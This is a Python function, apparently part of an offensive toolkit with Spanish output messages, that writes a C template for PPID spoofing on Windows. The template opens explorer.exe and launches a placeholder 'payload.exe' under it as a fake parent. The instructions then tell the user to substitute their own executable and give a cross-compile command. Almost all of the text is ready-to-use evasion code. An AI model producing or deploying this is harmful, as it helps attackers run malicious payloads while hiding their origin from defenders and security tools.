def generate_ppid_code():
    print("\n[+] Generando plantilla para PPID Spoofing...")

    code = '''
// templates/ppid_spoof.c
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "kernel32.lib")

int main() {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;
    HANDLE hParent;
    DWORD pid = 0;

    // Buscar proceso padre (explorer.exe)
    HWND hwnd = FindWindowA("Shell_TrayWnd", NULL);
    GetWindowThreadProcessId(hwnd, &pid);

    hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hParent) {
        printf("[-] No se pudo abrir el proceso padre\\n");
        return -1;
    }

    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    // Proceso hijo (modifica aquí)
    char cmd[] = "payload.exe";

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
        (LPSTARTUPINFOA)&si, &pi)) {
        printf("[-] Error al crear proceso\\n");
        return -2;
    }

    printf("[+] Proceso hijo lanzado con PPID spoofing\\n");

    CloseHandle(hParent);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    return 0;
}
'''

    with open("templates/ppid_spoof.c", "w") as f:
        f.write(code.strip())

    print("[+] Archivo generado: templates/ppid_spoof.c")
    print("[+] edita la linea  34, char cmd[] = tuexe.exe; pones tu exe.")
    print("[+]Compilas: x86_64-w64-mingw32-gcc templates/ppid_spoof.c -o ppid.exe -O2")
